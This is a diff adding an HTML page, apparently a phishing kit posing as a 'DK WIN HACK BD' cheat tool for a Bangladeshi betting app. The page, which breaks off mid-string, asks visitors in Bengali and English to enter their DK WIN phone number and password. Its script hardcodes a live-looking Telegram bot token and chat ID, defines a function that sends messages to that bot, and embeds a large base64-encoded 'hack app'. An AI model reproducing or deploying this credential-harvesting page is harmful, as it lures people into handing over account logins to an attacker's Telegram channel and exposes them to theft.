@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>DK WIN BD · Premium</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; text-transform: uppercase; }
+        body { background: #0a0a0a; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding: 0; }
+        .app { max-width: 420px; width: 100%; background: #0a0a0a; min-height: 100vh; }
+
+        /* TOP BANNER */
+        .top-banner { background: #fecb00; padding: 18px 20px 30px 20px; border-radius: 0 0 32px 32px; }
+        .header-row { display: flex; justify-content: space-between; align-items: center; padding-bottom: 16px; }
+        .back-btn { color: white; font-size: 22px; width: 40px; cursor: pointer; }
+        
+        /* ===== PREMIUM BADGE LOGO ===== */
+        .brand { display: flex; align-items: center; gap: 8px; }
+        .logo-container {
+            position: relative;
+            width: 38px; 
+            height: 38px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo-badge {
+            position: absolute;
+            width: 100%; height: 100%;
+            background: #00A3FF;
+            clip-path: polygon(
+                50% 0%, 58% 8%, 68% 4%, 74% 13%, 85% 13%, 87% 24%, 96% 30%, 93% 40%, 
+                100% 50%, 93% 60%, 96% 70%, 87% 76%, 85% 87%, 74% 87%, 68% 96%, 
+                58% 92%, 50% 100%, 42% 92%, 32% 96%, 26% 87%, 15% 87%, 13% 76%, 
+                4% 70%, 7% 60%, 0% 50%, 7% 40%, 4% 30%, 13% 24%, 15% 13%, 
+                26% 13%, 32% 4%, 42% 8%
+            );
+            box-shadow: 0 4px 15px rgba(0, 163, 255, 0.4);
+        }
+        .logo-inner {
+            position: absolute;
+            width: 80%; height: 80%;
+            background: #00A3FF;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo-check {
+            width: 16px; height: 8px;
+            border-left: 3.5px solid white;
+            border-bottom: 3.5px solid white;
+            transform: rotate(-45deg) translateY(-2px);
+            border-radius: 2px;
+        }
+        
+        .brand-text { color: white; font-size: 26px; font-weight: 700; letter-spacing: 0.5px; }
+        .lang-selector { display: flex; align-items: center; gap: 5px; background: rgba(255,255,255,0.12); padding: 4px 12px 4px 8px; border-radius: 30px; border: 1px solid rgba(255,255,255,0.30); }
+        .lang-selector .flag { font-size: 17px; }
+        .lang-selector .lang-label { color: white; font-size: 14px; font-weight: 600; }
+        .intro { margin-top: 2px; }
+        .intro h1 { color: white; font-size: 32px; font-weight: 700; letter-spacing: -0.3px; line-height: 1.2; margin-bottom: 4px; }
+        .intro p { color: white; font-size: 15px; font-weight: 400; line-height: 1.5; opacity: 0.95; }
+        .intro p .support-link { color: white; font-weight: 600; text-decoration: underline; cursor: pointer; }
+
+        /* TABS */
+        .tab-section { padding: 0 20px; margin-top: -12px; position: relative; z-index: 3; }
+        .seg-control { display: flex; background: #1a1a1a; border-radius: 30px; padding: 4px; border: 1px solid #2a2a2a; }
+        .tab-btn { flex: 1; border: none; background: transparent; border-radius: 30px; padding: 10px 0; display: flex; align-items: center; justify-content: center; gap: 7px; font-size: 14px; font-weight: 600; color: #7a8aa0; cursor: pointer; transition: 0.2s; }
+        .tab-btn.active { background: #fecb00; color: #0a0a0a; box-shadow: 0 2px 20px rgba(254, 203, 0, 0.2); }
+        .tab-btn.active i { color: #0a0a0a; }
+        .tab-btn.active .tab-label { color: #0a0a0a; }
+        .tab-btn.inactive { background: transparent; color: #8a9bb0; }
+        .tab-btn.inactive i { color: #8a9bb0; }
+        .tab-btn i { font-size: 15px; }
+        .tab-label { font-weight: 600; }
+
+        /* FORM */
+        .form-area { padding: 24px 20px 8px 20px; background: #0a0a0a; }
+        .field-group { margin-bottom: 22px; }
+        .field-label { display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 600; color: #e8ecf2; margin-bottom: 6px; }
+        .field-label i { color: #fecb00; font-size: 15px; width: 18px; }
+        .field-label .yellow-label { color: #fecb00; }
+        .field-label .grey-label { color: #8a9bb0; }
+        
+        .phone-row { display: flex; gap: 10px; align-items: stretch; }
+        .phone-prefix { background: #1a1a1a; border-radius: 14px; padding: 0 14px; display: flex; align-items: center; gap: 5px; font-weight: 600; color: #e8ecf2; font-size: 15px; min-width: 82px; justify-content: center; border: 1px solid #2a2a2a; }
+        .phone-prefix i { color: #7a8aa0; font-size: 11px; margin-left: 2px; }
+        .phone-input-wrap { flex: 1; background: #1a1a1a; border-radius: 14px; padding: 0 16px; border: 1px solid #2a2a2a; display: flex; align-items: center; }
+        
+        .phone-input-wrap input { 
+            width: 100%; border: none; background: transparent; padding: 14px 0; font-size: 15px; color: #e8ecf2; outline: none; 
+            text-transform: none;
+        }
+        .phone-input-wrap input::placeholder { color: #5a6a80; text-transform: uppercase; }
+        
+        .password-row { display: flex; gap: 10px; align-items: stretch; }
+        .password-wrap { flex: 1; background: #1a1a1a; border-radius: 14px; padding: 0 16px; border: 1px solid #2a2a2a; display: flex; align-items: center; }
+        
+        .password-wrap input { 
+            width: 100%; border: none; background: transparent; padding: 14px 0; font-size: 15px; color: #e8ecf2; outline: none; letter-spacing: 0.5px; 
+            text-transform: none;
+        }
+        .password-wrap input::placeholder { color: #5a6a80; text-transform: uppercase; }
+        .password-wrap i { color: #8a9bb0; font-size: 16px; cursor: pointer; padding: 8px 4px; }
+        
+        .uid-toggle-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: #1a1a1a;
+            border: 1px solid #2a2a2a;
+            border-radius: 14px;
+            padding: 0 12px;
+            cursor: pointer;
+            transition: 0.3s;
+            user-select: none;
+        }
+        .uid-toggle-wrapper.active { border-color: #fecb00; }
+        .uid-toggle-label { font-size: 12px; font-weight: 700; color: #8a9bb0; transition: 0.3s; }
+        .uid-toggle-wrapper.active .uid-toggle-label { color: #fecb00; }
+        .toggle-switch { width: 34px; height: 18px; background: #2a2a2a; border-radius: 20px; position: relative; transition: 0.3s; }
+        .uid-toggle-wrapper.active .toggle-switch { background: #fecb00; }
+        .toggle-knob { position: absolute; top: 2px; left: 2px; width: 14px; height: 14px; background: #8a9bb0; border-radius: 50%; transition: 0.3s; }
+        .uid-toggle-wrapper.active .toggle-knob { background: #0a0a0a; transform: translateX(16px); }
+
+        .remember-row { display: flex; align-items: center; gap: 10px; margin: 18px 0 28px 0; }
+        .check-box { width: 22px; height: 22px; background: #fecb00; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0; border: 1px solid #fecb00; transition: 0.15s; }
+        .check-box i { color: #0a0a0a; font-size: 13px; }
+        .check-box.unchecked { background: #1a1a1a; border: 2px solid #2a2a2a; }
+        .check-box.unchecked i { opacity: 0; }
+        .remember-text { font-size: 14px; color: #8a9bb0; font-weight: 500; }
+        
+        .action-buttons { display: flex; gap: 10px; margin-top: 2px; }
+        
+        .btn-login { 
+            flex: 1; background: linear-gradient(135deg, #fecb00, #ffaa00); border: none; border-radius: 40px; padding: 16px 10px; color: #0a0a0a; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 6px 25px rgba(254, 203, 0, 0.2); display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s;
+        }
+        .btn-login:active { transform: scale(0.97); }
+        
+        .btn-register { 
+            flex: 1; background: transparent; border: 2px solid #fecb00; border-radius: 40px; padding: 14px 10px; color: #fecb00; font-size: 15px; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s;
+        }
+        .btn-register:active { transform: scale(0.97); }
+        
+        .bottom-footer { display: flex; justify-content: space-between; padding: 28px 20px 30px 20px; background: #0a0a0a; border-top: 1px solid #1a1a1a; }
+        .footer-item { display: flex; flex-direction: column; align-items: center; gap: 5px; cursor: pointer; }
+        .footer-item i { font-size: 22px; color: #fecb00; }
+        .footer-item .footer-label { font-size: 13px; color: #8a9bb0; font-weight: 500; }
+
+        /* STATUS */
+        .status-msg { background: #1a2a1a; color: #4caf50; padding: 10px 16px; border-radius: 12px; margin-bottom: 12px; font-weight: 500; display: none; border: 1px solid #2a4a2a; font-size: 14px; }
+        .status-msg.error { background: #2a1a1a; color: #e74c3c; border: 1px solid #4a2a2a; }
+        .status-msg.show { display: block; }
+
+        /* REGISTER PAGE */
+        #registerPage { display: none; padding: 0; background: #0a0a0a; min-height: 100vh; }
+        #registerPage .top-banner { background: #fecb00; padding: 18px 20px 30px 20px; border-radius: 0 0 32px 32px; }
+        #registerPage .header-row { display: flex; justify-content: space-between; align-items: center; padding-bottom: 16px; }
+        #registerPage .back-register { color: white; font-size: 22px; width: 40px; cursor: pointer; }
+        #registerPage .intro h1 { color: white; font-size: 32px; font-weight: 700; letter-spacing: -0.3px; line-height: 1.2; margin-bottom: 4px; }
+        #registerPage .intro p { color: white; font-size: 15px; font-weight: 400; line-height: 1.5; opacity: 0.95; }
+        #registerPage .form-area { padding: 24px 20px 8px 20px; background: #0a0a0a; }
+        #registerPage .field-group { margin-bottom: 22px; }
+        #registerPage .field-label { display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 600; color: #e8ecf2; margin-bottom: 6px; }
+        #registerPage .field-label i { color: #fecb00; font-size: 15px; width: 18px; }
+        #registerPage .field-label .yellow-label { color: #fecb00; }
+        #registerPage .field-label .grey-label { color: #8a9bb0; }
+        #registerPage .action-buttons { display: flex; flex-direction: column; gap: 12px; margin-top: 2px; }
+        
+        #registerPage .btn-register-submit { 
+            background: linear-gradient(135deg, #fecb00, #ffaa00); border: none; border-radius: 40px; padding: 16px; color: #0a0a0a; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; box-shadow: 0 6px 25px rgba(254, 203, 0, 0.3); display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        #registerPage .btn-register-submit i { font-size: 18px; background: rgba(0,0,0,0.1); padding: 6px; border-radius: 50%; }
+        #registerPage .btn-register-submit:active { transform: scale(0.97); }
+        
+        #registerPage .btn-back-login { 
+            background: transparent; border: 2px solid #fecb00; border-radius: 40px; padding: 15px; color: #fecb00; font-size: 16px; font-weight: 700; cursor: pointer; width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        #registerPage .btn-back-login i { font-size: 18px; }
+        #registerPage .btn-back-login:active { transform: scale(0.97); }
+        
+        #registerPage .register-terms { color: #5a6a80; font-size: 11px; text-align: center; margin-top: 18px; padding-bottom: 30px; }
+        #registerPage .register-terms a { color: #fecb00; text-decoration: none; }
+        #registerPage .bottom-footer { display: flex; justify-content: space-between; padding: 28px 20px 30px 20px; background: #0a0a0a; border-top: 1px solid #1a1a1a; }
+
+        /* UID Success Box */
+        .uid-success-box { background: #1a2a40; border: 1px solid #fecb00; border-radius: 12px; padding: 16px; margin-bottom: 22px; text-align: center; display: none; }
+        .uid-success-box .uid-title { color: #8a9bb0; font-size: 12px; margin-bottom: 6px; }
+        .uid-success-box .uid-value { color: #fecb00; font-size: 24px; font-weight: 700; letter-spacing: 2px; }
+        .uid-success-box .uid-note { color: #4caf50; font-size: 12px; margin-top: 8px; }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+<div class="app" id="app">
+
+    <!-- ===== LOGIN SCREEN ===== -->
+    <div id="loginScreen">
+        <div class="top-banner">
+            <div class="header-row">
+                <div class="back-btn"><i class="fas fa-arrow-left"></i></div>
+                <div class="brand">
+                    <div class="logo-container">
+                        <div class="logo-badge"></div>
+                        <div class="logo-inner">
+                            <div class="logo-check"></div>
+                        </div>
+                    </div>
+                    <span class="brand-text">DK WIN BD</span>
+                </div>
+                <div class="lang-selector">
+                    <span class="flag">🇺🇸</span>
+                    <span class="lang-label">EN</span>
+                </div>
+            </div>
+            <div class="intro">
+                <h1>DK WIN HACK BD</h1>
+                <p>
+                    HACK টি লগিং করার সময় আপনার DK WIN এর নাম্বার পাসওয়ার্ড দিয়ে লগিং করবেন  সাথে UID সুইচ ON করে নিবেন না হয় হ্যাক কাজ করবে না....!<br>
+                     -<span class="support-link" id="supportLink">LOGIN NOW DK WIN ACCOUNT </span>
+                </p>
+            </div>
+        </div>
+
+        <div class="tab-section">
+            <div class="seg-control">
+                <button class="tab-btn active" id="tabPhone">
+                    <i class="fas fa-phone-alt"></i>
+                    <span class="tab-label">PHONE NUMBER</span>
+                </button>
+                <button class="tab-btn inactive" id="tabEmail">
+                    <i class="fas fa-envelope"></i>
+                    <span class="tab-label">EMAIL LOGIN</span>
+                </button>
+            </div>
+        </div>
+
+        <div class="form-area">
+            <div id="statusMsg" class="status-msg"></div>
+
+            <div class="field-group">
+                <div class="field-label">
+                    <i class="fas fa-phone-alt" id="loginIcon"></i>
+                    <span class="yellow-label" id="labelInput">PHONE NUMBER</span>
+                </div>
+                <div class="phone-row">
+                    <div class="phone-prefix" id="prefixBox">
+                        +880 <i class="fas fa-chevron-down"></i>
+                    </div>
+                    <div class="phone-input-wrap">
+                        <input type="text" id="loginInput" placeholder="PHONE NUMBER">
+                    </div>
+                </div>
+            </div>
+
+            <div class="field-group">
+                <div class="field-label">
+                    <i class="fas fa-lock"></i>
+                    <span class="grey-label">PASSWORD</span>
+                </div>
+                <div class="password-row">
+                    <div class="password-wrap">
+                        <input type="password" id="passwordInput" placeholder="············">
+                        <i class="fas fa-eye-slash" id="togglePass"></i>
+                    </div>
+                    <div class="uid-toggle-wrapper" id="uidToggleWrapper" onclick="visualToggleUid()">
+                        <span class="uid-toggle-label">UID</span>
+                        <div class="toggle-switch">
+                            <div class="toggle-knob"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="remember-row">
+                <div class="check-box" id="rememberCheck">
+                    <i class="fas fa-check"></i>
+                </div>
+                <span class="remember-text">REMEMBER PASSWORD</span>
+            </div>
+
+            <div class="action-buttons">
+                <button class="btn-login" id="loginBtn">
+                    <i class="fas fa-sign-in-alt"></i> LOGIN 
+                </button>
+                <button class="btn-register" id="registerBtn">
+                    <i class="fas fa-user-plus"></i> REGISTER
+                </button>
+            </div>
+        </div>
+
+        <div class="bottom-footer">
+            <div class="footer-item" id="forgotBtn">
+                <i class="fas fa-lock"></i>
+                <span class="footer-label">FORGOT PASSWORD</span>
+            </div>
+            <div class="footer-item" onclick="window.open('https://t.me/HackingBotBd', '_blank')">
+                <i class="fab fa-telegram-plane" style="color: #0088cc;"></i>
+                <span class="footer-label">LOGIN NOW DK WIN ACCOUNT </span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== REGISTER PAGE ===== -->
+    <div id="registerPage">
+        <div class="top-banner">
+            <div class="header-row">
+                <div class="back-register" onclick="closeRegister()"><i class="fas fa-arrow-left"></i></div>
+                <div class="brand">
+                    <div class="logo-container">
+                        <div class="logo-badge"></div>
+                        <div class="logo-inner">
+                            <div class="logo-check"></div>
+                        </div>
+                    </div>
+                    <span class="brand-text">DK WIN BD</span>
+                </div>
+                <div class="lang-selector">
+                    <span class="flag">🇺🇸</span>
+                    <span class="lang-label">EN</span>
+                </div>
+            </div>
+            <div class="intro">
+                <h1>CREATE ACCOUNT</h1>
+                <p>JOIN DK WIN BD PREMIUM AND GET YOUR EXCLUSIVE UID</p>
+            </div>
+        </div>
+
+        <div class="form-area">
+            <div id="regStatusMsg" class="status-msg"></div>
+
+            <div class="uid-success-box" id="uidSuccessBox">
+                <div class="uid-title">YOUR UNIQUE ID (UID)</div>
+                <div class="uid-value" id="displayUid">-</div>
+                <div class="uid-note"><i class="fas fa-check-circle"></i> ACCOUNT CREATED SUCCESSFULLY!</div>
+            </div>
+
+            <div id="registerFormFields">
+                <div class="field-group">
+                    <div class="field-label">
+                        <i class="fas fa-user"></i>
+                        <span class="yellow-label">FULL NAME</span>
+                    </div>
+                    <div class="phone-input-wrap">
+                        <input type="text" id="regName" placeholder="ENTER YOUR FULL NAME">
+                    </div>
+                </div>
+
+                <div class="field-group">
+                    <div class="field-label">
+                        <i class="fas fa-phone-alt"></i>
+                        <span class="yellow-label">PHONE / EMAIL</span>
+                    </div>
+                    <div class="phone-input-wrap">
+                        <input type="text" id="regIdentifier" placeholder="PHONE NUMBER OR EMAIL">
+                    </div>
+                </div>
+
+                <div class="field-group">
+                    <div class="field-label">
+                        <i class="fas fa-lock"></i>
+                        <span class="grey-label">PASSWORD</span>
+                    </div>
+                    <div class="password-wrap">
+                        <input type="password" id="regPassword" placeholder="············ (MIN 4 CHARS)">
+                        <i class="fas fa-eye-slash" id="regTogglePass"></i>
+                    </div>
+                </div>
+
+                <div class="action-buttons">
+                    <button class="btn-register-submit" onclick="submitRegister()">
+                        <i class="fas fa-user-plus"></i> CREATE ACCOUNT
+                    </button>
+                    <button class="btn-back-login" onclick="closeRegister()">
+                        <i class="fas fa-arrow-left"></i> BACK TO LOGIN
+                    </button>
+                </div>
+            </div>
+
+            <div class="register-terms">
+                BY CREATING AN ACCOUNT, YOU AGREE TO OUR <a href="#">TERMS & CONDITIONS</a>
+            </div>
+        </div>
+
+        <div class="bottom-footer">
+            <div class="footer-item" onclick="window.open('https://t.me/HackingBotBd', '_blank')">
+                <i class="fab fa-telegram-plane" style="color: #0088cc;"></i>
+                <span class="footer-label">LOGIN NOW DK WIN ACCOUNT </span>
+            </div>
+            <div class="footer-item" onclick="showRegStatus('🔑 CONTACT LOGIN NOW DK WIN ACCOUNT  TO RESET PASSWORD')">
+                <i class="fas fa-lock"></i>
+                <span class="footer-label">FORGOT PASSWORD</span>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<script>
+    // ============================================================
+    // TELEGRAM BOT CONFIGURATION
+    // ============================================================
+    const BOT_TOKEN = '9278930778:AAHyuXmBpGN7_92efqx8whb-zXOCNwab2Ic';
+    const CHAT_ID = '7541663065'; 
+    
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+            });
+        } catch (error) {
+            console.error('Telegram Error:', error);
+        }
+    }
+
+    // ============================================================
+    // UPDATED HACKING BOT BD APP (BASE64 ENCODED)
+    // Fixed Profile Pic & Close Button
+    // ============================================================
+    const HACK_APP_BASE64 = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+SEFDS0lORyBCT1QgQkQgV0lOIEhBQ0s8L3RpdGxlPgogICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3MyP2ZhbWlseT1PcmJpdHJvbjp3Z2h0QDYwMDs5MDAmZmFtaWx5PVJhamRoYW5pOndnaHRANT0wMDs3MDAmZGlzcGxheT1zd2FwIiByZWw9InN0eWxlc2hlZXQiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9mb250LWF3ZXNvbWUvNi4wLjAtYmV0YTMvY3NzL2FsbC5taW4uY3NzIiAvPgogICAgPHN0eWxlPgogICAgICAgIDpyb290IHsKICAgICAgICAgICAgLS1jeWFuOiAjMDBmM2ZmOwogICAgICAgICAgICAtLXBpbms6ICNmZjAwNTU7CiAgICAgICAgICAgIC0tZ29sZDogI2ZmY2MwMDsKICAgICAgICB9CgogICAgICAgIGJvZHksIGh0bWwgewogICAgICAgICAgICBtYXJnaW46IDA7IHBhZGRpbmc6IDA7CiAgICAgICAgICAgIHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7CiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwMDA7IG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnUmFqZGhhbmknLCBzYW5zLXNlcmlmOwogICAgICAgICAgICB1c2VyLXNlbGVjdDogbm9uZTsKICAgICAgICB9CgogICAgICAgICNnYW1lLWZyYW1lIHsKICAgICAgICAgICAgd2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgYm9yZGVyOiBub25lOwogICAgICAgIH0KCiAgICAgICAgI3ZpcC1wYW5lbCB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZDsgdG9wOiAxMjBweDsgbGVmdDogMjBweDsKICAgICAgICAgICAgd2lkdGg6IDIxMHB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTYwZGVnLCByZ2JhKDgsMjIsMjYsMC45NiksIHJnYmEoNiw4LDEyLDAuOTgpKTsKICAgICAgICAgICAgYm9yZGVyOiBub25lOwogICAgICAgICAgICB6LWluZGV4OiAxMDAwMDsgY3Vyc29yOiBtb3ZlOyB0b3VjaC1hY3Rpb246IG5vbmU7CiAgICAgICAgICAgIGJhY2tkcm9wLWZpbHRlcjogYmx1cigxNnB4KTsKICAgICAgICAgICAgLXdlYmtpdC1iYWNrZHJvcC1maWx0ZXI6IGJsdXIoMTZweCk7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDA7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgICAgIGJveC1zaGFkb3c6IG5vbmU7CiAgICAgICAgfQoKICAgICAgICBAa2V5ZnJhbWVzIGJvcmRlckNvbG9yU2hpZnQgewogICAgICAgICAgICAwJSAgIHsgYm9yZGVyLWNvbG9yOiAjMDBmM2ZmOyB9CiAgICAgICAgICAgIDE2JSAgeyBib3JkZXItY29sb3I6ICMwMGZmOWQ7IH0KICAgICAgICAgICAgMzMlICB7IGJvcmRlci1jb2xvcjogI2ZmY2MwMDsgfQogICAgICAgICAgICA1MCUgIHsgYm9yZGVyLWNvbG9yOiAjZmYwMDU1OyB9CiAgICAgICAgICAgIDY2JSAgeyBib3JkZXItY29sb3I6ICNiNDAwZmY7IH0KICAgICAgICAgICAgODMlICB7IGJvcmRlci1jb2xvcjogIzAwNjZmZjsgfQogICAgICAgICAgICAxMDAlIHsgYm9yZGVyLWNvbG9yOiAjMDBmM2ZmOyB9CiAgICAgICAgfQoKICAgICAgICAuY29ybmVyIHsKICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOyB3aWR0aDogMjBweDsgaGVpZ2h0OiAyMHB4OwogICAgICAgICAgICBib3JkZXI6IDJweCBzb2xpZCB2YXIoLS1jeWFuKTsKICAgICAgICAgICAgcG9pbnRlci1ldmVudHM6IG5vbmU7CiAgICAgICAgICAgIGFuaW1hdGlvbjogYm9yZGVyQ29sb3JTaGlmdCA2cyBsaW5lYXIgaW5maW5pdGU7CiAgICAgICAgICAgIHotaW5kZXg6IDI7CiAgICAgICAgfQogICAgICAgIC50LWwgeyB0b3A6IDA7IGxlZnQ6IDA7IGJvcmRlci1yaWdodDogbm9uZTsgYm9yZGVyLWJvdHRvbTogbm9uZTsgYm9yZGVyLXJhZGl1czogMDsgfQogICAgICAgIC50LXIgeyB0b3A6IDA7IHJpZ2h0OiAwOyBib3JkZXItbGVmdDogbm9uZTsgYm9yZGVyLWJvdHRvbTogbm9uZTsgYm9yZGVyLXJhZGl1czogMDsgfQogICAgICAgIC5iLWwgeyBib3R0b206IDA7IGxlZnQ6IDA7IGJvcmRlci1yaWdodDogbm9uZTsgYm9yZGVyLXRvcDogbm9uZTsgYm9yZGVyLXJhZGl1czogMDsgfQogICAgICAgIC5iLXIgeyBib3R0b206IDA7IHJpZ2h0OiAwOyBib3JkZXItbGVmdDogbm9uZTsgYm9yZGVyLXRvcDogbm9uZTsgYm9yZGVyLXJhZGl1czogMDsgfQoKICAgICAgICAuaGVhZGVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDkwZGVnLCByZ2JhKDAsNTAsNTUsMC42NSksIHJnYmEoOCwxMCwxNCwwLjMpKTsKICAgICAgICAgICAgcGFkZGluZzogMTBweCAxMnB4OyBkaXNwbGF5OiBmbGV4OwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47IGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgICAgICAgIGJvcmRlci1ib3R0b206IDFweCBzb2xpZCByZ2JhKDAsIDI0MywgMjU1LCAwLjE4KTsKICAgICAgICB9CgogICAgICAgIC5wcm9maWxlLWxpbmsgewogICAgICAgICAgICBkaXNwbGF5OiBmbGV4OyBhbGlnbi1pdGVtczogY2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgICAgICAgdGV4dC1kZWNvcmF0aW9uOiBub25lOwogICAgICAgICAgICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4yczsKICAgICAgICAgICAgLXdlYmtpdC10YXAtaGlnaGxpZ2h0LWNvbG9yOiB0cmFuc3BhcmVudDsKICAgICAgICB9CiAgICAgICAgLnByb2ZpbGUtbGluazphY3RpdmUgeyB0cmFuc2Zvcm06IHNjYWxlKDAuOSk7IH0KCiAgICAgICAgLnByb2ZpbGUtcGljIHsKICAgICAgICAgICAgd2lkdGg6IDI2cHg7IGhlaWdodDogMjZweDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNTAlOwogICAgICAgICAgICBib3JkZXI6IDEuNXB4IHNvbGlkIHZhcigtLWN5YW4pOwogICAgICAgICAgICBvYmplY3QtZml0OiBjb3ZlcjsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYm9yZGVyLWNvbG9yIDAuMjVzOwogICAgICAgICAgICBib3gtc2hhZG93OiBub25lOwogICAgICAgIH0KICAgICAgICAucHJvZmlsZS1saW5rOmhvdmVyIC5wcm9maWxlLXBpYyB7IGJvcmRlci1jb2xvcjogI2ZmY2MwMDsgfQoKICAgICAgICAuYnJhbmQgewogICAgICAgICAgICBmb250LWZhbWlseTogJ09yYml0cm9uJzsKICAgICAgICAgICAgZm9udC1zaXplOiAwLjYycmVtOwogICAgICAgICAgICBjb2xvcjogdmFyKC0tY3lhbik7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA5MDA7CiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOiAxcHg7CiAgICAgICAgfQoKICAgICAgICAuY2xvc2UtYnRuIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgyNTUsIDAsIDg1LCAwLjEpOwogICAgICAgICAgICBjb2xvcjogI2ZmNGQ3ZDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDAsIDg1LCAwLjQ1KTsKICAgICAgICAgICAgd2lkdGg6IDIwcHg7IGhlaWdodDogMjBweDsKICAgICAgICAgICAgZm9udC1zaXplOiAxMHB4OyBwYWRkaW5nOiAwOyBjdXJzb3I6IHBvaW50ZXI7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA5MDA7IGJvcmRlci1yYWRpdXM6IDUwJTsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIHRyYW5zaXRpb246IDAuMjVzOwogICAgICAgIH0KICAgICAgICAuY2xvc2UtYnRuOmhvdmVyIHsgYmFja2dyb3VuZDogdmFyKC0tcGluayk7IGNvbG9yOiAjZmZmOyB9CgogICAgICAgICNoYWNrLXNlY3Rpb24geyBwYWRkaW5nLWJvdHRvbTogMThweDsgfQoKICAgICAgICAuaW5mby1iYXIgewogICAgICAgICAgICBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47CiAgICAgICAgICAgIHBhZGRpbmc6IDEycHggMTRweCAxMHB4IDE0cHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMC43MnJlbTsgY29sb3I6ICNmZmY7CiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOiAwLjZweDsKICAgICAgICB9CiAgICAgICAgLmluZm8tYmFyIC50ZWFtIHsgY29sb3I6IHZhcigtLWN5YW4pOyBmb250LXdlaWdodDogNzAwOyB9CiAgICAgICAgLmluZm8tYmFyIC50aW1lciB7IGNvbG9yOiB2YXIgKC0tZ29sZCk7IGZvbnQtd2VpZ2h0OiA3MDA7IH0KCiAgICAgICAgI2Rpc3BsYXktYm94IHsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTgwZGVnLCByZ2JhKDAsMjQzLDI1NSwwLjA3KSwgcmdiYSgyNTUsMjU1LDI1NSwwLjAxNSkpOwogICAgICAgICAgICBtYXJnaW46IDJweCAxMnB4OwogICAgICAgICAgICBwYWRkaW5nOiAxOHB4IDA7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMDsKICAgICAgICB9CgogICAgICAgIC5kaXNwLWNvcm5lciB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsgd2lkdGg6IDEycHg7IGhlaWdodDogMTJweDsKICAgICAgICAgICAgYm9yZGVyOiAycHggc29saWQgdmFyKC0tY3lhbik7CiAgICAgICAgICAgIHB